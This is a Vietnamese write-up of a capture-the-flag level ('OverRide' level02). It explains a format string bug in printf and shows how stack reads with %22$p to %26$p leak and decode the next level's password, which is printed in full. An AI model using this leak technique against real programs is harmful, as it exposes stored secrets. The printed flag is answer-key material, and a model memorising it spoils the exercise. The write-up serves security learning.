RELRO         STACK CANARY          NX               PIE             RPATH        RUNPATH         FILE
No RELRO 🔴    No canary found 🔴   NX disabled 🔴    No PIE 🔴       No RPATH 🟢   No RUNPATH 🟢   /home/users/level02/level02

---

# 📒 NHẬT KÝ KHAI THÁC: LEVEL 02 @ OVERRIDE

## 1. Dấu hiệu nhận biết & Lỗ hổng

* **Mục tiêu:** Lấy mật khẩu của `level03` đang được nạp vào bộ nhớ.
* **Lỗ hổng:** **Format String Vulnerability** tại dòng: `printf(&var_78);`.
* **Nguyên nhân:** Lập trình viên truyền trực tiếp biến `var_78` (Username) vào `printf` mà không có định dạng `%s`. Điều này cho phép người dùng nhập các ký tự điều khiển (`%p`, `%x`, `%s`) để đọc/ghi bộ nhớ Stack.

---

## 2. Kiến thức nền tảng: Biến cục bộ & Stack

Để hiểu tại sao mật khẩu lại nằm đó, ta cần hiểu cấu trúc **Stack**.

* **Biến cục bộ (Local Variables):** Khi hàm `main` được gọi, nó chiếm một vùng nhớ trên Stack (gọi là **Stack Frame**). Tất cả các biến khai báo trong hàm như `var_78` (Username), `buf` (Password nhập vào), và `buf_1` (Mật khẩu thật từ file) đều là biến cục bộ.
* **Cấu trúc xếp tầng:** Các biến này được đặt nằm cạnh nhau trong "nhà kho" Stack.
* **Cơ chế "Soi đèn":** Hàm `printf` khi thực thi sẽ tìm các tham số trên Stack. Bằng cách sử dụng `%p`, chúng ta giống như đang cầm đèn pin soi từ vị trí của `printf` đi qua các "chiếc hộp" biến cục bộ khác trên cùng một sàn nhà (Stack Frame).

---

## 3. Quá trình khai thác

### Bước 1: Thăm dò (Initial Discovery)

Dùng `%p.%p.%p...` để in Stack. Ta nhận thấy dữ liệu lạ (dạng văn bản ASCII) xuất hiện từ vị trí thứ **22**.

* **Kỹ thuật:** Dùng `Direct Parameter Access` (`%22$p`) để nhảy thẳng tới vị trí đó.

### Bước 2: Thất bại đầu tiên (The Fail)

* **Dữ liệu thu được:** 4 cụm Hex từ `%22$p` đến `%25$p`.
* **Giải mã:** Được 32 ký tự: `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5`.
* **Kết quả:** `Authentication failure`.
* **Lý do thất bại:** Quan sát kỹ code thấy lệnh `fread(&buf_1, 1, 0x29, fp);`.
* $0x29$ (Hex) = **41** (Decimal).
* Ta mới lấy được 32 ký tự, nghĩa là còn thiếu tận 9 ký tự nữa!



### Bước 3: Khắc phục & Thành công

Ta mở rộng phạm vi soi đèn pin đến vị trí thứ **26** (`%26$p`).

* **Cụm Hex thứ 5:** `0x48336750664b394d`.
* **Giải mã Little Endian:** Đọc ngược từng byte từ phải sang trái:
* `4d 39 4b 66 50 67 33 48` $\rightarrow$ `M9KfPg3H`.



---

## 4. Tổng kết dữ liệu (The Payload)

| Vị trí | Giá trị Hex (Little Endian) | Chuỗi ASCII (Đã đảo ngược) |
| --- | --- | --- |
| `%22$p` | `0x756e505234376848` | `Hh74RPnu` |
| `%23$p` | `0x45414a3561733951` | `Q9sa5JAE` |
| `%24$p` | `0x377a7143574e6758` | `XgNWCqz7` |
| `%25$p` | `0x354a35686e475873` | `sXGnh5J5` |
| `%26$p` | `0x48336750664b394d` | `M9KfPg3H` |

**Mật khẩu hoàn chỉnh (40 ký tự):**

> `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

---

## 5. Bài học rút ra

1. **Đừng bao giờ tin vào con số cảm tính:** Thấy 32 ký tự đẹp rồi nhưng vẫn phải đối chiếu với `fread` trong code để biết độ dài thực tế.
2. **Little Endian là quy tắc sống còn:** Trong bộ nhớ x86_64, dữ liệu được lưu ngược. Nếu không đảo byte, mật khẩu sẽ sai hoàn toàn.
3. **Lỗ hổng Format String cực kỳ quyền năng:** Không cần ghi đè (Overwrite), chỉ cần đọc (Read) cũng đủ để chiếm quyền điều khiển hoặc lấy thông tin nhạy cảm.

---

**Flag của Level 03:** (Bạn hãy gõ `cat /home/users/level03/.pass` sau khi `su level03` để lấy nhé!)
